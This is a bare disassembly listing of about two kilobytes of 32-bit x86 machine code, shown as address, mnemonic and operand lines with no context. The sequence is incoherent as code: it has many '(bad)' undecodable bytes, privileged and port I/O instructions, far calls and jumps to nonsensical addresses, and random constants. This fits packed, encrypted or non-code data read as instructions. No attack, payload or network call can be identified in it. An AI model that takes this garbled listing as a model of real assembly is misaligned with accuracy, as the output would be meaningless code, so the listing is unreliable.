  40a3b0:	mov    ds:0x44aa5e01,eax
  40a3b5:	inc    eax
  40a3b6:	add    esi,0xfffffff9
  40a3b9:	out    0x58,eax
  40a3bb:	jg     0x40a372
  40a3bd:	stos   BYTE PTR es:[edi],al
  40a3be:	dec    ecx
  40a3bf:	in     al,dx
  40a3c0:	push   esp
  40a3c2:	leave  
  40a3c3:	and    edi,DWORD PTR [ecx+0x7378091f]
  40a3c9:	fchs   
  40a3cb:	or     DWORD PTR [edx],edx
  40a3cd:	int3   
  40a3ce:	call   0x2b1888f7
  40a3d3:	pop    edx
  40a3d4:	mov    esi,0x6e999bcf
  40a3d9:	aaa    
  40a3da:	xchg   ebx,eax
  40a3db:	xor    esp,ecx
  40a3dd:	add    eax,0xef4e1a71
  40a3e2:	dec    ebx
  40a3e3:	adc    dh,0x4f
  40a3e6:	scas   al,BYTE PTR es:[edi]
  40a3e7:	adc    al,0x48
  40a3e9:	retf   0xd21e
  40a3ec:	pop    ss
  40a3ed:	xor    eax,0x68f177b1
  40a3f2:	popf   
  40a3f3:	xor    BYTE PTR [esi+0x5fe8add7],ah
  40a3f9:	mov    dh,0x3f
  40a3fc:	push   edi
  40a3fd:	push   eax
  40a3fe:	stc    
  40a3ff:	jp     0x40a38d
  40a401:	stos   BYTE PTR es:[edi],al
  40a402:	rcr    BYTE PTR [esi-0x247b5b43],1
  40a408:	(bad)  
  40a409:	int    0xbe
  40a40b:	push   ebp
  40a40c:	mov    ah,0x84
  40a40e:	jns    0x40a3e9
  40a410:	(bad)  
  40a411:	pop    ebx
  40a412:	xchg   ebp,eax
  40a413:	xchg   edi,eax
  40a414:	cmp    ch,BYTE PTR [eax-0x2a]
  40a417:	push   ss
  40a418:	add    BYTE PTR [eax+0x2e],dh
  40a41b:	popf   
  40a41c:	stos   DWORD PTR es:[edi],eax
  40a41d:	push   esi
  40a41e:	mov    cl,0x6
  40a420:	lods   al,BYTE PTR ds:[esi]
  40a421:	push   cs
  40a422:	imul   ebp,DWORD PTR [ebp+edx*1+0x7ed9c8fe],0x7f24044c
  40a42d:	pop    ebp
  40a42e:	sbb    DWORD PTR [edx-0x52],eax
  40a431:	push   es
  40a432:	fdiv   st(5),st
  40a434:	add    DWORD PTR [esi],0x15
  40a437:	(bad)
  40a43a:	nop
  40a43b:	and    al,BYTE PTR [esi]
  40a43d:	adc    ebx,edx
  40a43f:	inc    esp
  40a440:	xor    BYTE PTR [esi-0x3262f1a6],0x85
  40a447:	add    BYTE PTR [edi-0x50],cl
  40a44a:	pusha  
  40a44b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a44c:	mov    ecx,0x5b43d431
  40a451:	loop   0x40a4b1
  40a453:	nop
  40a454:	leave  
  40a455:	aam    0xa6
  40a457:	add    DWORD PTR [ebx+0x17e16b83],ecx
  40a45d:	jle    0x40a48e
  40a45f:	jge    0x40a4d0
  40a461:	pop    esi
  40a462:	push   cs
  40a463:	test   BYTE PTR [eax+0x47],dl
  40a466:	into   
  40a467:	add    esi,DWORD PTR [ecx-0x78]
  40a46a:	js     0x40a491
  40a46c:	xlat   BYTE PTR ds:[ebx]
  40a46d:	mov    ebp,0xd419a358
  40a472:	mov    ecx,0xb84924f1
  40a477:	hlt    
  40a478:	cmp    al,0x95
  40a47a:	mov    al,ds:0x5849735
  40a47f:	inc    esi
  40a480:	repnz shl BYTE PTR [ecx+0x63],1
  40a484:	mov    cl,0x6e
  40a486:	rol    dl,1
  40a488:	(bad)  
  40a489:	adc    esi,DWORD PTR [ebp+0x3b]
  40a48c:	and    BYTE PTR [edi+0x6fcbab9c],dh
  40a492:	pop    esi
  40a493:	push   ecx
  40a494:	ret    
  40a495:	data16 and BYTE PTR [ecx-0x4d],ah
  40a499:	inc    ebx
  40a49a:	ret    0x8ad6
  40a49d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a49e:	push   0x6d
  40a4a0:	cmp    BYTE PTR [eax-0x28],0x79
  40a4a4:	mov    ebp,0x10d8bce9
  40a4a9:	sbb    BYTE PTR [esi],cl
  40a4ab:	push   edx
  40a4ac:	dec    eax
  40a4ad:	mov    esi,0xba5ffd37
  40a4b2:	mov    ds,ebp
  40a4b4:	mov    ah,0xb4
  40a4b6:	pop    ebp
  40a4b7:	and    al,0xf8
  40a4b9:	aaa    
  40a4ba:	pop    eax
  40a4bb:	ins    DWORD PTR es:[edi],dx
  40a4bc:	mov    DWORD PTR [edx-0x69],edx
  40a4bf:	push   ebp
  40a4c0:	test   eax,0x1980dd8f
  40a4c5:	pop    ss
  40a4c6:	ret    0xccb
  40a4c9:	mov    esp,0x666f3c3f
  40a4ce:	sbb    al,0xc5
  40a4d0:	mov    bl,0x1c
  40a4d2:	mov    eax,esp
  40a4d4:	push   eax
  40a4d5:	adc    ch,cl
  40a4d7:	into   
  40a4d8:	jecxz  0x40a51a
  40a4da:	pop    eax
  40a4db:	call   0x2481d1b8
  40a4e0:	jae    0x40a549
  40a4e2:	repz pop ebp
  40a4e4:	sbb    eax,0x3ab34d67
  40a4e9:	jne    0x40a505
  40a4eb:	loope  0x40a55a
  40a4ed:	je     0x40a4d6
  40a4ef:	shl    ebp,0x2b
  40a4f2:	(bad)  
  40a4f3:	jnp    0x40a51f
  40a4f5:	rcr    DWORD PTR [ebp-0x6d],1
  40a4f8:	lahf   
  40a4f9:	leave  
  40a4fa:	or     al,0xa7
  40a4fc:	mov    al,ds:0x4b1e088d
  40a501:	shr    DWORD PTR [edx+0x38],1
  40a504:	add    bl,BYTE PTR cs:[eax+0x26fe850a]
  40a50b:	jmp    0x344d19da
  40a510:	sbb    DWORD PTR [ecx+0x4c],esp
  40a513:	ror    BYTE PTR [ecx+0x314866df],1
  40a519:	enter  0xe0dc,0xef
  40a51d:	push   ds
  40a51e:	add    al,0xfd
  40a520:	pushf  
  40a521:	push   es
  40a522:	pop    eax
  40a523:	imul   ebp,DWORD PTR [eax+esi*8-0x29d7ea0a],0x583875a1
  40a52e:	xchg   DWORD PTR [ebx],esi
  40a530:	imul   edx,DWORD PTR [esi+edx*1+0x3a],0x81df5c9a
  40a538:	test   eax,0xb8c570b7
  40a53d:	fist   DWORD PTR [esi+0x2a11948f]
  40a543:	ret    
  40a544:	ja     0x40a516
  40a546:	sub    ebx,esp
  40a548:	jle    0x40a572
  40a54a:	xor    eax,0x73a71a1e
  40a54f:	sbb    dl,ch
  40a551:	mov    dx,0x371
  40a555:	retf   0x7de1
  40a558:	xchg   ebx,eax
  40a559:	call   0xa67e:0x47954e47
  40a560:	xor    eax,0x1354c1cd
  40a565:	mov    ch,0x99
  40a567:	push   ds
  40a568:	adc    DWORD PTR [edx+0x5c],esp
  40a56b:	or     dl,BYTE PTR [ecx]
  40a56d:	ds arpl bx,sp
  40a570:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a571:	outs   dx,DWORD PTR ds:[esi]
  40a572:	outs   dx,DWORD PTR ds:[esi]
  40a573:	pinsrw mm4,esi,0x66
  40a577:	mov    edi,cs
  40a579:	dec    edx
  40a57a:	aad    0xf
  40a57c:	fstp   QWORD PTR [ecx+0x29]
  40a57f:	cdq    
  40a580:	in     eax,dx
  40a581:	mov    ch,0x27
  40a583:	scas   eax,DWORD PTR es:[edi]
  40a584:	mov    bh,0x7c
  40a586:	lea    ebx,[esi-0x68]
  40a589:	cmp    eax,0xc4357f53
  40a58e:	in     al,dx
  40a58f:	outs   dx,DWORD PTR ds:[esi]
  40a590:	repz stc 
  40a592:	pusha  
  40a593:	(bad)  
  40a594:	mov    esp,0x1698682d
  40a599:	mov    ebx,0x408b525c
  40a59e:	cmp    eax,0x75c31d99
  40a5a3:	and    eax,0xf8478743
  40a5a8:	call   0x9ee9bb24
  40a5ad:	jbe    0x40a582
  40a5af:	test   BYTE PTR [esi-0x88180a7],cl
  40a5b5:	push   esi
  40a5b6:	sbb    bl,bh
  40a5b8:	retf   
  40a5b9:	loopne 0x40a61b
  40a5bb:	aas    
  40a5bc:	xchg   edi,eax
  40a5bd:	xchg   ecx,eax
  40a5be:	add    BYTE PTR [edx-0x18],ah
  40a5c1:	es ret 0xfa9c
  40a5c5:	mov    edx,0x84c9982c
  40a5ca:	sub    eax,eax
  40a5cc:	and    dh,bl
  40a5ce:	pop    es
  40a5cf:	and    DWORD PTR [ebx-0x17794193],0x26cf56dd
  40a5d9:	arpl   WORD PTR [ecx+0x5a4e65aa],di
  40a5df:	out    0x7d,al
  40a5e1:	aam    0xd4
  40a5e3:	and    BYTE PTR [esi-0x610fa7f1],dh
  40a5e9:	lds    ebp,FWORD PTR [esp+ebp*2]
  40a5ec:	adc    al,0xe1
  40a5ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5ef:	push   esi
  40a5f0:	add    BYTE PTR [edi-0x2a654469],cl
  40a5f6:	adc    BYTE PTR ds:0x378f4c5e,bh
  40a5fc:	jl     0x40a5ae
  40a5fe:	add    ebx,0xffffffc3
  40a601:	jg     0x40a5b3
  40a603:	xor    DWORD PTR [esi-0x255f432b],edi
  40a609:	mov    al,ds:0x87809e44
  40a60e:	(bad)  
  40a60f:	mov    edi,0xc91fbd84
  40a614:	stos   BYTE PTR es:[edi],al
  40a615:	adc    edx,DWORD PTR [si-0x15b7]
  40a61a:	inc    ebp
  40a61b:	dec    ebp
  40a61c:	popf   
  40a61d:	aam    0xb8
  40a61f:	jno    0x40a602
  40a621:	ja     0x40a60d
  40a623:	mov    eax,ds:0x6239cb5c
  40a628:	adc    dl,BYTE PTR [eax-0x26527ab6]
  40a62e:	adc    ch,ah
  40a630:	fs test eax,0x97a3d17c
  40a636:	jnp    0x40a5e4
  40a638:	pop    esi
  40a639:	ds adc DWORD PTR ss:[ecx-0xe],0xffffffa6
  40a63f:	jp     0x40a67a
  40a641:	clc    
  40a642:	pop    eax
  40a643:	in     al,dx
  40a644:	dec    ecx
  40a645:	pop    esp
  40a646:	and    bh,BYTE PTR [edx-0x44]
  40a649:	in     eax,0xe9
  40a64b:	dec    edi
  40a64c:	mov    edx,0xab4eac8a
  40a651:	dec    ebp
  40a652:	jl     0x40a6b8
  40a654:	sahf   
  40a655:	das    
  40a656:	adc    dl,al
  40a658:	sbb    al,0xab
  40a65a:	inc    ebp
  40a65b:	mov    esi,0x717ca60f
  40a660:	sbb    eax,0x418dabf4
  40a665:	cmp    edi,esp
  40a667:	adc    cl,BYTE PTR [edi-0x4f]
  40a66a:	es loope 0x40a647
  40a66d:	xlat   BYTE PTR ds:[ebx]
  40a66e:	and    dl,BYTE PTR ds:0xfe66d5b5
  40a674:	cmp    eax,0xa7452901
  40a679:	push   esp
  40a67a:	dec    esi
  40a67b:	mov    al,ds:0x4f137c6c
  40a680:	add    al,0x4e
  40a682:	and    BYTE PTR [ecx+0x5e214c90],al
  40a688:	push   esp
  40a689:	jne    0x40a61f
  40a68b:	and    DWORD PTR ss:[edx+eax*2+0x5e],ebx
  40a690:	mov    dh,0x7b
  40a692:	call   0xd831:0xac4e111c
  40a699:	test   al,0x13
  40a69b:	gs xchg ax,ax
  40a69e:	dec    edi
  40a69f:	fcmovb st,st(3)
  40a6a1:	fcmovbe st,st(4)
  40a6a3:	inc    edx
  40a6a4:	mov    edi,esp
  40a6a6:	rcl    BYTE PTR [eax+0x49da3296],1
  40a6ac:	bound  edi,QWORD PTR [esi-0x4e]
  40a6af:	mov    cl,0x49
  40a6b1:	jmp    DWORD PTR [edi-0x77]
  40a6b4:	ret    0x6406
  40a6b7:	inc    eax
  40a6b8:	pop    esp
  40a6b9:	xor    DWORD PTR [esp+ebp*8],ecx
  40a6bc:	loop   0x40a696
  40a6be:	in     eax,0x5b
  40a6c0:	cwde   
  40a6c1:	xchg   ecx,eax
  40a6c2:	sbb    DWORD PTR [ebx],ebp
  40a6c4:	mov    esp,0x7a797530
  40a6c9:	inc    ebx
  40a6ca:	cmp    eax,0xdb355747
  40a6cf:	mov    ebp,0xb20d75af
  40a6d4:	retf   0x3910
  40a6d7:	sub    BYTE PTR [eax+0x457606b8],ch
  40a6dd:	xlat   BYTE PTR ds:[ebx]
  40a6de:	pop    edi
  40a6df:	loope  0x40a729
  40a6e1:	sbb    bh,BYTE PTR [esi]
  40a6e3:	add    edx,esi
  40a6e5:	sbb    ebx,DWORD PTR [edx+eiz*1]
  40a6e8:	cmp    al,0xdd
  40a6ea:	nop
  40a6eb:	ja     0x40a674
  40a6ed:	xchg   ebx,eax
  40a6ee:	mov    esi,DWORD PTR [esi+ebx*1]
  40a6f1:	scas   eax,DWORD PTR es:[edi]
  40a6f2:	push   bx
  40a6f4:	pop    edi
  40a6f5:	cmp    eax,eax
  40a6f7:	push   ebp
  40a6f8:	xchg   edx,eax
  40a6f9:	leave  
  40a6fa:	icebp  
  40a6fb:	mov    ebp,0x2c69aba8
  40a700:	ret    0x71fc
  40a703:	or     eax,0xd5112a61
  40a708:	sbb    bh,dl
  40a70a:	sbb    BYTE PTR [esi],0x2f
  40a70d:	shr    DWORD PTR [ebp-0x2ceb97b4],0x54
  40a714:	inc    esi
  40a715:	ja     0x40a6ff
  40a717:	sub    al,0x59
  40a719:	fucomip st,st(4)
  40a71b:	jnp    0x40a6c1
  40a71d:	xor    al,dl
  40a71f:	inc    edi
  40a720:	cdq    
  40a721:	js     0x40a75a
  40a723:	jmp    0xee8b:0xf9479ab0
  40a72a:	inc    ecx
  40a72b:	mov    bh,0x71
  40a72d:	jnp    0x40a776
  40a72f:	out    0xe,al
  40a731:	je     0x40a701
  40a733:	push   ebp
  40a734:	push   ss
  40a735:	out    0x29,al
  40a737:	dec    ebp
  40a738:	pop    ds
  40a739:	cmp    DWORD PTR [edi-0x22],esi
  40a73c:	or     BYTE PTR [edi-0x7674e6d4],dl
  40a742:	sub    DWORD PTR [esi],0xb2068591
  40a748:	adc    eax,DWORD PTR [ebp+0x19]
  40a74b:	lea    esp,[edi]
  40a74d:	leave  
  40a74e:	icebp  
  40a74f:	push   es
  40a750:	pop    eax
  40a751:	(bad)  
  40a752:	aas    
  40a753:	add    BYTE PTR [eax+0x7c],ch
  40a756:	ret    0x61e
  40a759:	ins    BYTE PTR es:[edi],dx
  40a75a:	cmp    edx,DWORD PTR [ebx]
  40a75c:	repnz cmp al,0xbe
  40a75f:	and    esp,DWORD PTR [esi+0x7e]
  40a762:	nop
  40a763:	inc    eax
  40a764:	xor    cl,0x72
  40a767:	cmp    BYTE PTR [ecx-0x27286cbc],cl
  40a76d:	ret    
  40a76e:	mov    ebx,ss
  40a770:	in     eax,0x6c
  40a772:	ds cli 
  40a774:	push   edx
  40a775:	rcr    BYTE PTR [esi-0x2c],cl
  40a778:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a779:	adc    al,0xb1
  40a77b:	inc    esi
  40a77c:	std    
  40a77d:	inc    eax
  40a77e:	cli    
  40a77f:	pop    edi
  40a780:	push   eax
  40a781:	xchg   esi,eax
  40a782:	inc    edx
  40a783:	in     al,0xd
  40a785:	xchg   esp,eax
  40a786:	jmp    0x40a741
  40a788:	pop    ds
  40a789:	loope  0x40a7dc
  40a78b:	lods   eax,DWORD PTR ds:[esi]
  40a78c:	mov    ebp,0x4611eb04
  40a791:	shl    bl,0x90
  40a794:	fiadd  WORD PTR [ebp-0x37]
  40a797:	imul   eax,DWORD PTR [edi],0xffffffb9
  40a79a:	aaa    
  40a79b:	cmp    eax,eax
  40a79d:	daa    
  40a79e:	(bad)  
  40a79f:	jne    0x40a778
  40a7a1:	dec    ebp
  40a7a2:	dec    ecx
  40a7a3:	jmp    0xddba855a
  40a7a8:	mov    ds,WORD PTR [esp+ebp*2]
  40a7ab:	pop    esp
  40a7ac:	call   0xe7f3afe5
  40a7b1:	jbe    0x40a7a1
  40a7b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7b4:	ins    BYTE PTR es:[edi],dx
  40a7b5:	xchg   edi,eax
  40a7b6:	xchg   DWORD PTR [edi],edi
  40a7b8:	mov    ebp,0xfb2294f5
  40a7bd:	inc    esp
  40a7be:	pop    ecx
  40a7bf:	cdq    
  40a7c0:	repz mov dl,BYTE PTR [esi+0x39]
  40a7c4:	ja     0x40a7ac
  40a7c6:	mov    al,0x6a
  40a7c8:	cmp    al,BYTE PTR [eax+eiz*8-0x7bb6ec3a]
  40a7cf:	xor    eax,0x3826e2e7
  40a7d4:	fstp   QWORD PTR [edx+0x16]
  40a7d7:	mov    al,0xda
  40a7d9:	(bad)  
  40a7da:	adc    BYTE PTR [ebx-0x79ed4d69],bl
  40a7e0:	inc    edi
  40a7e1:	fsub   QWORD PTR [ebp+0x54]
  40a7e4:	mov    edx,0x3bbaafd4
  40a7e9:	push   esi
  40a7ea:	nop
  40a7eb:	push   edx
  40a7ec:	pop    ebx
  40a7ed:	mov    BYTE PTR [ecx*2+0x4962616],ah
  40a7f4:	vrcpps xmm3,XMMWORD PTR [ebx+0x6b]
  40a7f9:	inc    ebp
  40a7fa:	loope  0x40a82f
  40a7fc:	push   0x43f285af
  40a801:	daa    
  40a802:	push   esi
  40a803:	cmp    al,0x18
  40a805:	jl     0x40a7af
  40a807:	and    DWORD PTR [ecx-0x446f52c],0x85584443
  40a811:	xchg   ebp,eax
  40a812:	(bad)  
  40a813:	repz jb 0x40a7e1
  40a816:	aaa    
  40a817:	and    DWORD PTR [ecx-0x73c67396],edi
  40a81d:	and    dh,BYTE PTR [ecx+0x73]
  40a820:	and    ebx,ebp
  40a822:	stos   DWORD PTR es:[edi],eax
  40a823:	mov    al,ds:0xd92c3762
  40a828:	std    
  40a829:	repnz mov eax,0x9582949b
  40a82f:	xchg   esi,eax
  40a830:	lods   eax,DWORD PTR ds:[esi]
  40a831:	or     edx,DWORD PTR [ebx-0x3268fa3]
  40a837:	push   ebp
  40a838:	adc    ch,BYTE PTR [ecx+0x30]
  40a83b:	leave  
  40a83c:	lock (bad) 
  40a83e:	and    DWORD PTR ds:[esi],ebp
  40a841:	cmp    BYTE PTR [ebp+ebp*8+0x4],0x24
  40a846:	dec    ecx
  40a847:	sbb    eax,0x26a21f36
  40a84c:	pop    ecx
  40a84d:	pop    esp
  40a84e:	or     esp,DWORD PTR [ebx-0x52]
  40a851:	jbe    0x40a837
  40a853:	loope  0x40a856
  40a855:	in     al,0xcf
  40a857:	inc    eax
  40a858:	outs   dx,DWORD PTR ds:[esi]
  40a859:	push   0x41643276
  40a85e:	jnp    0x40a896
  40a860:	push   edi
  40a861:	or     DWORD PTR [edi+edx*1],edi
  40a864:	or     al,0x4a
  40a866:	mov    ah,0xef
  40a868:	es es xchg ch,dh
  40a86c:	(bad)  
  40a86d:	xor    al,0xd7
  40a86f:	shl    BYTE PTR [esi-0x1317af45],cl
  40a875:	inc    ecx
  40a876:	add    bl,BYTE PTR ss:[esi+esi*8]
  40a87a:	(bad)  
  40a87b:	dec    ecx
  40a87c:	(bad)
  40a87f:	xchg   esp,eax
  40a880:	nop
  40a881:	sub    ch,ah
  40a883:	xor    al,0x5d
  40a885:	cli    
  40a886:	and    eax,0x561f53c4
  40a88b:	(bad)  
  40a88c:	shl    dh,cl
  40a88e:	inc    eax
  40a88f:	or     esi,esp
  40a891:	sbb    DWORD PTR [ebp+0x78339a51],esi
  40a897:	pop    ecx
  40a898:	mov    ch,0x32
  40a89a:	add    BYTE PTR [edi],bh
  40a89c:	add    al,0xc2
  40a89e:	in     eax,0xfa
  40a8a0:	ja     0x40a8cb
  40a8a2:	push   esp
  40a8a3:	das    
  40a8a4:	inc    esi
  40a8a5:	inc    esp
  40a8a6:	xchg   ebx,eax
  40a8a7:	ins    DWORD PTR es:[edi],dx
  40a8a8:	enter  0x6bac,0x31
  40a8ac:	push   ss
  40a8ad:	loop   0x40a89d
  40a8af:	fisub  DWORD PTR [ebp-0x28d662b]
  40a8b5:	arpl   WORD PTR [ebp-0x57b71913],bp
  40a8bb:	popa   
  40a8bc:	mov    BYTE PTR [eax+ecx*4-0x88d3c23],bh
  40a8c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8c4:	fwait
  40a8c5:	mov    ebx,DWORD PTR [ebp-0x644cae03]
  40a8cb:	aam    0x0
  40a8cd:	xor    BYTE PTR [esi-0x46],0x33
  40a8d1:	xchg   edi,eax
  40a8d2:	out    dx,eax
  40a8d3:	sbb    eax,0xc1465dff
  40a8d8:	pusha  
  40a8d9:	nop
  40a8da:	lahf   
  40a8db:	dec    ebx
  40a8dc:	ss mov ebp,0xac2a19f6
  40a8e2:	pop    esi
  40a8e3:	or     DWORD PTR [esi-0x5fb0a3a],edi
  40a8e9:	aam    0xb3
  40a8eb:	test   DWORD PTR [ebp-0x73],edx
  40a8ee:	ins    DWORD PTR es:[edi],dx
  40a8ef:	fisttp WORD PTR [esi-0x3795ce63]
  40a8f5:	xchg   edx,eax
  40a8f6:	sub    DWORD PTR [esi],edx
  40a8f8:	push   es
  40a8f9:	mov    ah,0x20
  40a8fb:	cmp    DWORD PTR [eax+0x3f],edi
  40a8fe:	lahf   
  40a8ff:	jbe    0x40a92c
  40a901:	inc    ebp
  40a902:	mov    dh,0xc7
  40a904:	jnp    0x40a8ed
  40a906:	jns    0x40a969
  40a908:	mov    cs,WORD PTR [edx+0x4c]
  40a90b:	stos   BYTE PTR es:[edi],al
  40a90c:	call   0x849c:0xc3680466
  40a913:	inc    edi
  40a914:	int    0x44
  40a916:	xor    cl,BYTE PTR [edx+edx*1+0x40]
  40a91a:	fldl2t 
  40a91c:	retf   0x16d5
  40a91f:	adc    esi,esi
  40a921:	aas    
  40a922:	or     ch,BYTE PTR [esi]
  40a924:	cmp    eax,DWORD PTR [ebx*2-0x121c1a74]
  40a92b:	mov    dl,0x3f
  40a92d:	mov    ebp,0x3bb694a2
  40a932:	test   ebp,edx
  40a934:	icebp  
  40a935:	mov    edx,0xb62e9d29
  40a93a:	fnstcw WORD PTR [esi-0x21]
  40a93d:	cmp    eax,0x7d06547b
  40a942:	daa    
  40a943:	ja     0x40a94e
  40a945:	mov    edx,fs
  40a947:	sub    edi,DWORD PTR [eax]
  40a949:	mov    esp,0x10eb395a
  40a94e:	addr16 inc ebp
  40a950:	pop    ecx
  40a951:	dec    ebp
  40a952:	out    0xda,al
  40a954:	ret    
  40a955:	jg     0x40a9b5
  40a957:	sbb    BYTE PTR [ebp-0x2524146],dl
  40a95d:	(bad)  
  40a95e:	popf   
  40a95f:	outs   dx,DWORD PTR ds:[esi]
  40a960:	push   cs
  40a961:	mov    eax,0xcc536970
  40a967:	fdiv   st,st(4)
  40a969:	sub    esp,DWORD PTR ds:0x57afaa71
  40a96f:	retf   
  40a970:	mov    ah,0x27
  40a972:	adc    al,0xa7
  40a974:	push   ebp
  40a975:	(bad)  
  40a976:	adc    DWORD PTR [edi-0x7adf4dea],esi
  40a97c:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40a97e:	sub    ebp,DWORD PTR [ebp+0x74b718b1]
  40a984:	ja     0x40a997
  40a986:	cmc    
  40a987:	inc    ebp
  40a988:	inc    esp
  40a989:	cmp    eax,0x6d601ad5
  40a98e:	pop    ebp
  40a98f:	int3   
  40a990:	mov    bh,0xe
  40a992:	fisubr DWORD PTR [ebx-0x21]
  40a995:	pop    edx
  40a996:	or     eax,0xbaeaa8f0
  40a99b:	call   0x4e89:0xfe61d7bf
  40a9a2:	xor    BYTE PTR [esp+edi*4-0x411ad055],ch
  40a9a9:	dec    ecx
  40a9aa:	outs   dx,DWORD PTR ds:[esi]
  40a9ab:	xchg   edx,eax
  40a9ac:	repz jo 0x40aa18
  40a9af:	sti    
  40a9b0:	mov    edx,0x6a3d0270
  40a9b5:	rcr    DWORD PTR [ebx+eax*1-0x3],cl
  40a9b9:	les    eax,FWORD PTR [edx-0x37]
  40a9bc:	sub    edi,DWORD PTR cs:[esi-0x57]
  40a9c0:	loopne 0x40a98a
  40a9c2:	call   0x1cc2:0x508336a5
  40a9c9:	mov    bh,0xe3
  40a9cb:	mov    edi,0xba3513c0
  40a9d0:	dec    esp
  40a9d1:	jo     0x5cd4c475
  40a9d7:	mov    esi,0xb7083bde
  40a9dc:	xor    esp,ecx
  40a9de:	and    al,BYTE PTR [esi+0x4d]
  40a9e1:	int    0x9f
  40a9e3:	int3   
  40a9e4:	and    ebx,0xffffff8e
  40a9e7:	aaa    
  40a9e8:	pop    ebp
  40a9e9:	(bad)  
  40a9ea:	mov    ah,0x92
  40a9ec:	std    
  40a9ed:	mov    eax,0x53e9c9ea
  40a9f2:	aam    0x80
  40a9f4:	mov    cl,0xea
  40a9f6:	sbb    DWORD PTR fs:[ebp+0x6e0e60a3],esi
  40a9fd:	imul   edi,DWORD PTR [ecx-0x71],0xffffffe4
  40aa01:	ins    BYTE PTR es:[edi],dx
  40aa02:	retf   0x8567
  40aa05:	sbb    al,BYTE PTR [ebx+0x6df4cfe2]
  40aa0b:	add    al,0xee
  40aa0d:	cmp    ebp,ecx
  40aa0f:	sub    ch,cl
  40aa11:	cmp    al,0x9b
  40aa13:	xchg   esi,eax
  40aa14:	jmp    0x91d1:0x9f596c2b
  40aa1b:	stc    
  40aa1c:	in     eax,dx
  40aa1d:	or     DWORD PTR [edx],edx
  40aa1f:	add    eax,0x59a192eb
  40aa24:	mov    esi,0xbd57d07c
  40aa29:	mov    ebp,0xa53db989
  40aa2e:	dec    esp
  40aa2f:	pop    es
  40aa30:	adc    DWORD PTR [ebx+0x63],0x4c
  40aa34:	test   BYTE PTR [esi-0x60],0xe3
  40aa38:	inc    ebp
  40aa39:	pop    ebp
  40aa3a:	out    dx,al
  40aa3b:	ficomp DWORD PTR [edi]
  40aa3d:	outs   dx,DWORD PTR ds:[esi]
  40aa3e:	loope  0x40a9ed
  40aa40:	sbb    al,0xa2
  40aa42:	inc    esi
  40aa43:	int    0x9f
  40aa45:	xchg   esi,eax
  40aa46:	cwde   
  40aa47:	cld    
  40aa48:	mov    ecx,0xb3b5408
  40aa4d:	xor    DWORD PTR [ebx+0x7f18ccc8],ecx
  40aa53:	int    0x59
  40aa55:	or     eax,0x374c63de
  40aa5a:	(bad)  
  40aa5c:	dec    edi
  40aa5d:	addps  xmm1,XMMWORD PTR [edi-0x7c]
  40aa61:	push   esi
  40aa62:	or     edx,edx
  40aa64:	in     al,dx
  40aa65:	cmp    ebx,esp
  40aa67:	xchg   DWORD PTR [edx+0x64],eax
  40aa6a:	sub    ebp,ecx
  40aa6c:	or     al,0xf
  40aa6e:	and    DWORD PTR [ecx],edi
  40aa70:	outs   dx,BYTE PTR ds:[esi]
  40aa71:	js     0x40aa59
  40aa73:	sub    BYTE PTR [edx],dh
  40aa75:	xchg   esi,eax
  40aa76:	mov    cl,0x6a
  40aa78:	jns    0x40aaaf
  40aa7a:	std    
  40aa7b:	mov    ebp,0x3c66689c
  40aa80:	ja     0x40aa44
  40aa82:	jnp    0x40aa0e
  40aa84:	add    DWORD PTR [edx+0x41f9c364],eax
  40aa8a:	jl     0x40aad6
  40aa8c:	fisubr DWORD PTR [ecx-0x55]
  40aa8f:	fnstcw WORD PTR [edx+0x34]
  40aa92:	cld    
  40aa93:	push   ebp
  40aa94:	call   0x55bd:0x6ac984af
  40aa9b:	retf   0x2c71
  40aa9e:	hlt    
  40aa9f:	mov    edi,0xb603f186
  40aaa4:	aam    0xdb
  40aaa6:	fwait
  40aaa7:	in     eax,dx
  40aaa8:	into   
  40aaa9:	and    DWORD PTR [edi+edx*8-0x4fbcb1cf],edi
  40aab0:	or     eax,0x30ee7c50
  40aab5:	and    eax,0x89bfd341
  40aaba:	pusha  
  40aabb:	ss enter 0xac31,0x5b
  40aac0:	pushf  
  40aac1:	retf   
  40aac2:	in     al,dx
  40aac3:	aaa    
  40aac4:	cld    
  40aac5:	and    al,0xa2
  40aac7:	mov    cl,bh
  40aac9:	lods   eax,DWORD PTR ds:[esi]
  40aaca:	jnp    0x40aaf9
  40aacc:	push   ecx
  40aacd:	xor    BYTE PTR es:[ecx],bh
  40aad0:	xor    eax,0xfc64d87d
  40aad5:	xchg   BYTE PTR [ecx],dh
  40aad7:	nop
  40aad8:	mov    ?,WORD PTR [ebx+edi*8+0x235da01a]
  40aadf:	leave  
  40aae0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aae1:	stc    
  40aae2:	aaa    
  40aae3:	aam    0xb3
  40aae5:	pushf  
  40aae6:	rol    DWORD PTR [edx],cl
  40aae8:	and    al,0x2b
  40aaea:	iret   
  40aaeb:	mov    esp,0xc868ae04
  40aaf0:	mov    dh,0xfd
  40aaf2:	adc    DWORD PTR [ebx+edx*1],ebx
  40aaf5:	ds or  al,0x70
  40aaf8:	data16 faddp st(2),st
  40aafb:	dec    ecx
  40aafc:	push   ebx
  40aafd:	test   BYTE PTR [eax+0x4a],cl
  40ab00:	cmp    dl,cl
  40ab02:	xchg   edx,eax
  40ab03:	fdivr  QWORD PTR [ebp+0x76d63155]
  40ab09:	push   0x763817f9
  40ab0e:	call   0xb970:0xcd802318
  40ab15:	sbb    eax,0xee9747f
  40ab1a:	pop    eax
  40ab1b:	push   edx
  40ab1c:	sbb    al,0xcb
  40ab1e:	jmp    0x1a53066f
  40ab23:	(bad)  
  40ab24:	sub    eax,0x16c09443
  40ab29:	hlt    
  40ab2a:	adc    DWORD PTR [edi+0x19729fc8],esp
  40ab30:	dec    ebx
  40ab31:	sbb    bh,bl
  40ab33:	add    bh,BYTE PTR [ebx]
  40ab35:	iret   
  40ab36:	xchg   ebx,eax
  40ab37:	jg     0x40aaca
  40ab39:	and    eax,0xfc1b7142
  40ab3e:	xchg   ebx,eax
  40ab3f:	mov    eax,ds:0xdf87a13e
  40ab44:	xchg   ebx,eax
  40ab46:	sbb    eax,0x189f9f45
  40ab4b:	dec    esp
